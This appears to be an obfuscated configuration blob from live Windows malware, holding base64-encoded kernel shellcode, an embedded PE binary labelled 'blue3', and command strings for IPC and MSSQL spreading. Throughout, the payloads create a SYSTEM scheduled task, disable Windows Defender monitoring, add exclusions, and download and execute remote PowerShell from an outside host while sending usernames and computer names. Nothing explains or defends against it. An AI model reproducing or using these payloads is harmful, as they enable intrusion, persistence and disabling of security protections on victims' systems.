('wB69sc=[Convert]::FromBase64String(NDckMcBAD4SsBAAAYOgAAAAAW+gjAAAAuXYBAAAPMo17OTn4dBE5RQB0BolFAIlVCIn4MdIPMGHCJACNqwAQAADB7QzB5QyD7VDDuSMAAABqMA+hjtmOwWSLDUAAAACLYQRRnGDoAAAAAFvoy////4tFAIPAF4lEJCQxwJlC8A+wVQh1Erl2AQAAmYtFAA8w++gEAAAA+mGdw4tFAMHoDMHgDC0AEAAAZoE4TVp19IlFBLh4fPTb6LcAAACXuD9fZHdX6KsAAAAp+InBPXABAAB1A4PACI1YHI00H2ShJAEAAIs2ifIpwoH6AAQAAHfyUrjhFAEX6H8AAACLQAqNUASNNA/orwAAAD1aavrBdA492IPgPnQHizwXKdfr44l9DI0cH411EF+LWwQxwFVqAVVQ6AAAAACBBCSSAAAAUFMpPCRWuMRcGW3oJQAAADHAUFBQVrg0Rsyv6BUAAACFwHTGi0UcgHgOAXQHiQCJQATrtsPoAgAAAP/gYIttBJeLRTyLVAV4AeqLShiLWiAB60mLNIsB7ugdAAAAOfh18YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcNSMcCZrMHKDQHChcB19pJaw1iJRCQQWFlYWmBSUYsoMcBkoiQAAACZsEBQweAGUFRSiRFRSlK46pluV+h7////hcB1T1iLOOgAAAAAXoPGVbkABAAA86SLRQxQuEi4GLjoVv///4tADItAFIsAZoN4JBh194tQKIF6DDMAMgB164tYEIldBLheUV6D6DL///9ZiQExwIhFCEBkoiQAAABhw1pYWFlRUVHoAAAAAIMEJAlRUVL/4PzoggAAAGCJ5THAZItQMItSDItSFItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF440gB0VGLWSAB04tJGOM6SYs0iwHWMf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS641dagGNhbIAAABQaDGLb4f/1bvgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9VjbWQgL2Mgc2NodGFza3MgL2NyZWF0ZSAvcnUgc3lzdGVtIC9zYyBNSU5VVEUgL21vIDEyMCAvdG4gUnRzYSAvdHIgInBvd2Vyc2hlbGwgLWMgJ1tOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrPXsxfTtJRVgoTmVgdy1PYmpgZWN0IE5ldC5XZWJDYGxpZW50KS5cXFwiRG93bmxvYWRTdHJpbmdcXFwiKFxcXCJodHRwczovL3QubTduMHkuY29tL2ViLmpzcD8yLjAqJWNvbXB1dGVybmFtZSVcXFwiKSciIC9GICYgZWNobyAlcGF0aCV8ZmluZHN0ciAvaSBwb3dlcnNoZWxsPm51bCB8fCAoc2V0eCBwYXRoICIlcGF0aCU7Yzpcd2luZG93c1xzeXN0ZW0zMlxXaW5kb3dzUG93ZXJzaGVsbFx2MS4wIiAvbSkgJiBzY2h0YXNrcyAvcnVuIC90biBSdHNhAApV6C4AAAC5ggAAwA8yTI0NNAAAAEQ5yHQZOUUAdAqJVQSJRQDGRfgASZFQWkjB6iAPMF3DSI0tABAAAEjB7QxIweUMSIPtcMMPAfhlSIkkJRAAAABlSIskJagBAABqK2X/NCUQAAAAUFBV6MX/'+'//9Ii0UASIPAH0iJRCQQUVJBUEFRQVJBUzHAsgHwD7BV+HUUuYIAAMCLRQCLVQQPMPvoDgAAAPpBW0FaQVlBWFpZXVjDQVdBVldWU1BMi30AScHvDEnB5wxJge8AEAAAZkGBP01adfFMiX0IZUyLNCWIAQAAv3h89Nvo7AAAAEiRvz9fZHfo5wAAAItAA4nDPQAEAAByA4PAEEiNUChMjQQRTYnBTYsJTTnID4SxAAAATInITCnwSD0ABwAAd+ZNKc6/4RQBF+imAAAAi3gDg8cISI00GejfAAAAPVpq+sF0ED3Yg+A+dAlIiww5SCn56+C/SLgYuOhvAAAASIlF8EiNNBFIifNIi1sISDnedPdIjU0QTTHATI0NrQAAAFVqAVVBUEqNFDNIg+wgv8RcGW3oNQAAAEiNTRBNMcm/NEbMr+gkAAAASIPEQIXAdLhIi0UggHgaAXQJSIkASIlACOulWFteX0FeQV/D6AIAAAD/4FNRVkGLRzxBi4QHiAAAAEwB+FCLSBiLWCBMAfv/yYs0i0wB/ugfAAAAOfh171iLWCRMAftmiwxLi1gcTAH7iwSLTAH4Xllbw1IxwJmswcoNAcKFwHX2klrDVVNXVkFXSY'+'soTIt9CFJeTInLMcBEDyLASIkCicFI99FJicCwQFDB4AZQSYkBSIPsIL/qmW5X6GX///9Ig8QwhcB1RUiLPkiNNU0AAAC5AAYAAPOkSItF8EiLQBhIi0AgSIsAZoN4SBh19kiLUFCBegwzADIAdelMi3ggv15RXoPoIv///0iJAzHJiE34sQFEDyLBQV9eX1tdw0iSMclRUUmJyUyNBQ0AAACJykiD7CD/0EiDxDDD/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY21kIC9jIHNjaHRhc2tzIC9jcmVhdGUgL3J1IHN5c3'+'RlbSAvc2MgTUlOVVRFIC9tbyAxMjAgL3RuIFJ0c2EgL3RyICJwb3dlcnNoZWxsIC1jICdbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjaz17MX07SUVYKE5lYHctT2JqYGVjdCBOZXQuV2ViQ2BsaWVudCkuXFxcIkRvd25sb2FkU3RyaW5nXFxcIihcXFwiaHR0cHM6Ly90Lm03bjB5LmNvbS9lYi5qc3A/Mi4wKiVjb21wdXRlcm5hbWUlXFxcIiknIiAvRiAmIGVjaG8gJXBhdGglfGZpbmRzdHIgL2kgcG93ZXJzaGVsbD5udWwgfHwgKHNldHggcGF0aCAiJXBhdGglO2M6XHdpbmRvd3Ncc3lzdGVtMzJcV2luZG93c1Bvd2Vyc2hlbGxcdjEuMCIgL20pICYgc2NodGFza3MgL3J1biAvdG4gUnRzYQAKNDck)

wB69sco=[Convert]::FromBase64String(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NDck)

wB69ipc_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & start /b powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEir8x(Neir8w-Objir8ect Net.WebCir8lient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/7p.php?2.0*ipc*%username%*%computername%*utH9utH9+[Environment]::OSVersion.version.Major);bpu (utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/ipc.jsp?2.0utH9utH9)utH9

wB69ipco_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgB'+'lAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & start /b powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEir8x(Neir8w-Objir8ect Net.WebCir8lient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/7p.php?2.0*ipco*%username%*%computername%*utH9utH9+[Environment]::OSVersion.version.Major);bpu (utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/ipco.jsp?2.0utH9utH9)utH9

wB69base_core=utH9dHJ5eyhuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpKS5SdW4oImNtZCAvYyBwb3dlcnNoZWxsIC1lIFV3QmxBSFFBTFFCTkFIQUFVQUJ5QUdVQVpnQmxBSElBWlFCdUFHTUFaUUFnQUMwQVJBQnBBSE1BWVFCaUFHd0FaUUJTQUdVQVlRQnNBSFFBYVFCdEFHVUFUUUJ2QUc0QWFRQjBBRzhBY2dCcEFHNEFad0FnQURFQU93QkJBR1FBWkFBdEFFMEFjQUJRQUhJQVpRQm1BR1VBY2dCbEFHNEFZd0JsQUNBQUxRQkZB'+'SGdBWXdCc0FIVUFjd0JwQUc4QWJnQlFBR0VBZEFCb0FDQUFZd0E2QUZ3QU93QkJBR1FBWkFBdEFFMEFjQUJRQUhJQVpRQm1BR1VBY2dCbEFHNEFZd0JsQUNBQUxRQkZBSGdBWXdCc0FIVUFjd0JwQUc4QWJnQlFBSElBYndCakFHVUFjd0J6QUNBQVl3QTZBRndBZHdCcEFHNEFaQUJ2QUhjQWN3QmNBSE1BZVFCekFIUUFaUUJ0QURNQU1nQmNBRmNBYVFCdUFHUUFid0IzQUhNQVVBQnZBSGNBWlFCeUFGTUFhQUJsQUd3QWJBQmNBSFlBTVFBdUFEQUFYQUJ3QUc4QWR3QmxBSElBY3dCb0FHVUFiQUJzQUM0QVpRQjRBR1VBICYgcG93ZXJzaGVsbCBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjaz17MX07SUVgeChOZWB3LU9iamBlY3QgTmV0LldlYkNgbGllbnQpLkRvd25Mb2FkU3RyaW5nKCdodHRwczovL3QubTduJysnMHkuY29tLzdwLnBocD8yLjAqaXBjX2wqJXVzZXJuYW1lJSolY29tcHV0ZXJuYW1lJSonK1tFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi52ZXJzaW9uLk1ham9yKTticHUgKCdodHRwczovL3QubTduJysnMHkuY29tL2lwYy5qc3A/bCoyLjAnKSIsMCxmYWxzZSk7fWNhdGNoKGUpe30=utH9

wB69mssql_cmd=utH9cmd /c powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEir8x(Neir8w-Objir8ect Net.WebCir8lient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/ms.jsp?2.0*%computername%utH9utH9)utH9

wB69mssqlo_cmd=utH9cmd /c powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEir8x(Neir8w-Objir8ect Net.WebCir8lient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/mso.jsp?2.0*%computername%utH9utH9)utH9

wB69blue3_bin_b64=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